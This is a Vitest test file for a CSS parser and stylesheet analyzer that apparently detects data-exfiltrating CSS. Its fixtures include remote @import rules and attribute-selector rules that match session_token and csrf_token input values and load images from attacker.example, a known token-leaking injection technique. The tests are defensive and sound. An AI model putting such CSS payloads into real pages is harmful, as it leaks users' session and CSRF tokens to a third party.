import { describe, expect, it, vi } from "vitest";
import { analyzeStylesheet } from "../../../src/core/analyzer/analyzeStylesheet";
import { parseCss, parseLargeStylesheetCssWithBudget } from "../../../src/core/css/parseCss";

const pageUrl = "https://app.example.test/page";

function parserInput(cssText: string) {
	return { cssText, pageUrl, sourceKind: "stylesheet" as const, sourceUrl: pageUrl };
}

describe("CSS parser", () => {
	it("recovers remote imports independently from the sequential source-scan budget", () => {
		const cssText = `${".pad{display:block}\n".repeat(2000)}@import url("https://attacker.example/late.css");`;
		const result = parseLargeStylesheetCssWithBudget(parserInput(cssText), { startedAt: 0, maxMs: 1, now: () => 10_000 });
		expect(result.budgetExceeded).toBe(true);
		expect(result.recoveredImports).toBe(1);
		expect(result.rules.some((rule) => rule.type === "import" && rule.importValue === "https://attacker.example/late.css")).toBe(true);
	});

	it("emits actionable recovered imports even when the stylesheet analysis budget is exceeded", () => {
		const now = vi.spyOn(Date, "now");
		try {
			now.mockReturnValueOnce(0).mockReturnValue(10_000);
			const cssText = `${".pad{display:block}\n".repeat(2000)}@import url("https://attacker.example/late-budget.css");`;
			const summary = analyzeStylesheet(parserInput(cssText));
			expect(summary.state).toBe("analysis.skipped.performance_budget");
			expect(summary.findings.some((finding) => finding.destinationOrigin === "https://attacker.example")).toBe(true);
			expect(summary.findings.some((finding) => finding.reasons.includes("sink.import_remote"))).toBe(true);
			expect(summary.findings.some((finding) => finding.reasons.includes("analysis.skipped.performance_budget"))).toBe(true);
		} finally {
			now.mockRestore();
		}
	});

	it("supplements primary parsing with source-scanned nested security rules", () => {
		const cssText = `${".utility{display:block}\n".repeat(2000)}.card{& input[name="session_token"][value*="abc"]{mask-image:url("https://attacker.example/nested-source")}}`;
		const rules = parseCss(parserInput(cssText));
		expect(rules.some((rule) => rule.context.atRuleStack.includes("nested-style-rule") && rule.selector.includes("session_token"))).toBe(true);
	});

	it("recovers malformed nested blocks and huge unmatched strings without throwing", () => {
		const rules = parseCss(parserInput(`@media screen { .outer { color: red; input[name="csrf_token"][value^="a"] { background:url("https://attacker.example/nested") } ${"'".repeat(5000)}`));
		expect(Array.isArray(rules)).toBe(true);
		expect(rules.some((rule) => rule.type === "style" || rule.type === "import")).toBe(true);
	});
	it("preserves @page declarations as print-context style rules", () => {
		const rules = parseCss(parserInput('@page{background-image:url("https://observer.example.test/page.svg")}'));
		expect(rules.some((rule) => rule.selector === "@page" && rule.context.atRuleStack.some((entry) => /^@page\b/i.test(entry)))).toBe(true);
	});

});
